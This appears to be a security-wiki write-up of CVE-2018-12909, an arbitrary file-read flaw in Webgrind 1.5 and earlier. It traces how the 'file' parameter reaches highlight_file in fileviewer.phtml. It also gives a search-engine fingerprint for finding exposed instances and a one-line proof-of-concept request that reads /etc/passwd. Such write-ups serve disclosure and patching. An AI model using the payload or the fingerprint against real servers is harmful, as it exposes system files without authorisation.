# Webgrind fileviewer.phtml Arbitrary file reading vulnerability CVE-2018-12909

## Vulnerability Description

Webgrind is a set of PHP execution time analysis tools. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Webgrind <= 1.5</span>

## Network surveying and mapping

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">app="Webgrind"</span>

## Vulnerability reappears

Main page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661596655330-55288965-9281-4c56-924c-b3f07951093f.png)

Method calls in index.php

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661596715954-2bc1af96-68be-445a-9509-f1bd225109b5.png)

When the parameter is fileviewer, pass the parameter into the file templates/fileviewer.phtml

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661596833979-0efa39c3-d2c7-4464-b2ef-db1f1f62759e.png)

Parameter file passed in `fileviewer.phtml` and displayed on the page through the function `highlight_file` to verify the POC

```php
/index.php?op=fileviewer&file=/etc/passwd
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1661597383081-351322c2-a214-4ffd-8878-a718d51b5e64.png)